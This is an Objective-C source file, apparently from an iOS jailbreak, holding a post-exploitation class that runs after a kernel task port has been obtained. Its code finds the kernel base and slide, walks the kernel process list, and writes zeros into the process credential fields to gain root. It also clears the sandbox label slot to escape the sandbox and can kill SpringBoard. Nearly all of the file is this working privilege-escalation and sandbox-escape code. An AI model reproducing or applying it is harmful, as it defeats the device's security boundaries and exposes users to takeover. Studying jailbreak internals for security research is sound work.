#import <Foundation/Foundation.h>
#include "post.h"
#import "kernel_memory.h"
#import "kernel_slide.h"
#import "offsets.h"
#include <sys/sysctl.h>
#include "parameters.h"
#include "patchfinder64.h"
#include <UIKit/UIDevice.h>
#include <sys/utsname.h>
#include "log.h"

@implementation Post

// Debugging //

- (void)debug {
    usleep(0); // p [self save];
    usleep(0); // p [self mobile];
    usleep(0); // p log_internal('I', "Debugging...", NULL);
    usleep(0); // p log_internal('I', "Finished debugging", NULL);
    usleep(0); // p [self restore];
}

// Variables //

static int SAVED_SET[2] = { 0, 0 };

// General post-exploitation method //

- (bool)go {
    // Check if tfp0 is valid
    if (!MACH_PORT_VALID(kernel_task_port)) {
        return false;
    }
    // Init offsets
    offs_init();
    // Get root
    [self root];
    // Unsandbox
    [self unsandbox];
    // If we can, initialise patchfinder64
    [self initialise_patchfinder64];
    // For debugging purposes
    [self debug];
    // Did we succeed?
    bool success = [self isRoot] && ![self isSandboxed];
    if (success) INFO("Post-exploitation was successful!");
    if (!success) INFO("Post-exploitation failed.");
    return success;
}

// patchfinder64 //

- (BOOL)is_patchfinder64_initialised {
    return patchfinder64_is_initialised();
}

- (void)initialise_patchfinder64 {
    if ([self is_patchfinder64_initialised]) return;
    if ([self isSupportedAndIsNotA12]) {
        // Kernel base
        uint64_t base = [self kernel_base];
        // Initialise patchfinder64
        init_patchfinder64(base);
        INFO("Initialised patchfinder64");
    }
}

- (void)terminate_patchfinder64 {
    if (![self is_patchfinder64_initialised]) return;
    if ([self isSupportedAndIsNotA12]) {
        // Terminate patchfinder64
        term_patchfinder64();
        INFO("Terminated patchfinder64");
    }
}

// Kernel base/slide //

- (uint64_t)kernel_slide {
    if (!kernel_slide) kernel_slide_init();
    INFO("Found kernel slide: 0x%llx", kernel_slide);
    return kernel_slide;
}

- (uint64_t)kernel_base {
    uint64_t kernel_base = [self kernel_slide] + STATIC_ADDRESS(kernel_base);
    INFO("Found kernel base: 0x%llx", kernel_base);
    return kernel_base;
}

// Checks //

- (struct utsname)uname {
    struct utsname u;
    uname(&u);
    return u;
}

- (int)modelDigitsBeforeComma {
    struct utsname u = [self uname];
    char read[257];
    int ii = 0;
    for (int i = 0; i < 256; i++) {
        char chr = u.machine[i];
        long num = chr - '0';
        if (num == -4 || chr == 0) {
            break;
        }
        if (num >= 0 && num <= 9) {
            read[ii] = chr;
            ii++;
        }
    }
    read[ii + 1] = 0;
    int digits = atoi(read);
    return digits;
}

- (bool)isSupported {
    if ([[UIDevice currentDevice].model isEqualToString:@"iPod touch"]) {
        return true;
    }
    int digits = [self modelDigitsBeforeComma];
    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) {
        if (digits < 8) {
            return false;
        }
    } else if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad) {
        if (digits < 6) {
            return false;
        }
    }
    return true;
}

- (bool)isUnsupported {
    return ![self isSupported];
}

- (bool)isA12 {
    if ([[UIDevice currentDevice].model isEqualToString:@"iPod touch"]) {
        return false;
    }
    int digits = [self modelDigitsBeforeComma];
    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) {
        if (digits == 11) {
            //INFO("This is an A12 device");
            return true;
        }
    } else if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad) {
        if (digits == 8) {
            //INFO("This is an A12 device");
            return true;
        }
    }
    //INFO("This isn't an A12 device");
    return false;
}

- (bool)isSupportedAndIsNotA12 {
    return [self isSupported] && ![self isA12];
}

// Users //

- (bool)isRoot {
    return !getuid() && !getgid();
}

- (bool)isMobile {
    return getuid() == 501 && getgid() == 501;
}

- (void)setUID:(uid_t)uid {
    [self setUID:uid forProc:[self selfproc]];
}

- (void)setUID:(uid_t)uid forProc:(uint64_t)proc {
    if (getuid() == uid) return;
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    kernel_write32(proc + off_p_uid, uid);
    kernel_write32(proc + off_p_ruid, uid);
    kernel_write32(ucred + off_ucred_cr_uid, uid);
    kernel_write32(ucred + off_ucred_cr_ruid, uid);
    kernel_write32(ucred + off_ucred_cr_svuid, uid);
    INFO("Overwritten UID to %i for proc 0x%llx", uid, proc);
}

- (void)setGID:(gid_t)gid {
    [self setGID:gid forProc:[self selfproc]];
}

- (void)setGID:(gid_t)gid forProc:(uint64_t)proc {
    if (getgid() == gid) return;
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    kernel_write32(proc + off_p_gid, gid);
    kernel_write32(proc + off_p_rgid, gid);
    kernel_write32(ucred + off_ucred_cr_rgid, gid);
    kernel_write32(ucred + off_ucred_cr_svgid, gid);
    INFO("Overwritten GID to %i for proc 0x%llx", gid, proc);
}

- (void)setUIDAndGID:(int)both {
    [self setUIDAndGID:both forProc:[self selfproc]];
}

- (void)setUIDAndGID:(int)both forProc:(uint64_t)proc {
    [self setUID:both forProc:proc];
    [self setGID:both forProc:proc];
}

- (void)root {
    [self setUIDAndGID:0];
}

- (void)mobile {
    [self setUIDAndGID:501];
}

// Sandbox //

- (bool)isSandboxed {
    if (!MACH_PORT_VALID(kernel_task_port)) {
        [[NSFileManager defaultManager] createFileAtPath:@"/var/TESTF" contents:nil attributes:nil];
        if (![[NSFileManager defaultManager] fileExistsAtPath:@"/var/TESTF"]) return true;
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/TESTF" error:nil];
        return false;
    }
    return kernel_read64(kernel_read64(kernel_read64([self selfproc] + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) != 0;
}

- (bool)isSandboxed:(uint64_t)proc {
    return kernel_read64(kernel_read64(kernel_read64(proc + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) != 0;
}

- (void)unsandbox {
    [self unsandbox:[self selfproc]];
}

- (void)unsandbox:(uint64_t)proc {
    INFO("Unsandboxed proc 0x%llx", proc);
    if (![self isSandboxed]) return;
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
    kernel_write64(cr_label + off_sandbox_slot, 0);
}

// Procs //

- (uint64_t)allproc {
    static uint64_t proc = 0;
    if (proc) return proc;
    proc = [self selfproc];
    // i think the max pid value is 99998?
    for (pid_t i = 0; i < 99998 - getpid(); i++) {
        uint64_t tmp_proc = kernel_read64(proc + 8);
        if (!tmp_proc /* if we can't read here, the previously read address was allproc */) {
            INFO("Found allproc: 0x%llx", proc);
            return proc;
        }
        // not allproc - let's try this one?
        proc = tmp_proc;
    }
    return 0;
}

- (uint64_t)selfproc {
    static uint64_t proc = 0;
    if (!proc) {
        proc = kernel_read64(current_task + OFFSET(task, bsd_info));
        INFO("Found proc 0x%llx for PID %i", proc, getpid());
    }
    return proc;
}

- (uint64_t)kernproc {
    static uint64_t proc = 0;
    if (!proc) {
        proc = kernel_read64(kernel_task + OFFSET(task, bsd_info));
        INFO("Found proc 0x%llx for PID %i", proc, 0);
    }
    return proc;
}

- (uint64_t)proc_for_pid:(pid_t)pid {
    if (pid == getuid()) {
        return [self selfproc];
    } else if (!pid) {
        return [self kernproc];
    }
    uint64_t proc = [self allproc];
    while (proc) {
        if (kernel_read32(proc + off_p_pid) == pid) {
            INFO("Found proc 0x%llx for PID %i", proc, pid);
            return proc;
        }
        proc = kernel_read64(proc);
    }
    return 0;
}

- (pid_t)pid_for_name:(NSString *)name {
    [self save];
    [self root];
    static int maxArgumentSize = 0;
    size_t size = sizeof(maxArgumentSize);
    sysctl((int[]){ CTL_KERN, KERN_ARGMAX }, 2, &maxArgumentSize, &size, NULL, 0);
    int mib[3] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL };
    struct kinfo_proc *info;
    size_t length;
    sysctl(mib, 3, NULL, &length, NULL, 0);
    info = malloc(length);
    sysctl(mib, 3, info, &length, NULL, 0);
    for (int i = 0; i < length / sizeof(struct kinfo_proc); i++) {
        pid_t pid = info[i].kp_proc.p_pid;
        if (pid == 0) {
            continue;
        }
        size_t size = maxArgumentSize;
        char *buffer = (char *)malloc(length);
        sysctl((int[]){ CTL_KERN, KERN_PROCARGS2, pid }, 3, buffer, &size, NULL, 0);
        NSString *executable = [NSString stringWithCString:buffer + sizeof(int) encoding:NSUTF8StringEncoding];
        free(buffer);
        if ([executable isEqual:name]) {
            INFO("Found PID %i for name %s", pid, name.UTF8String);
            free(info);
            [self restore];
            return pid;
        } else if ([[executable lastPathComponent] isEqual:name]) {
            INFO("Found PID %i for name %s", pid, name.UTF8String);
            free(info);
            [self restore];
            return pid;
        }
    }
    free(info);
    [self restore];
    return -1;
}

- (void)respring {
    [self unsandbox];
    kill([self pid_for_name:@"/System/Library/CoreServices/SpringBoard.app/SpringBoard"], SIGTERM);
}

// Save/Restore //

- (void)save {
    SAVED_SET[0] = getuid();
    SAVED_SET[1] = getgid();
}

- (void)restore {
    [self setUID:SAVED_SET[0]];
    [self setGID:SAVED_SET[1]];
}

@end
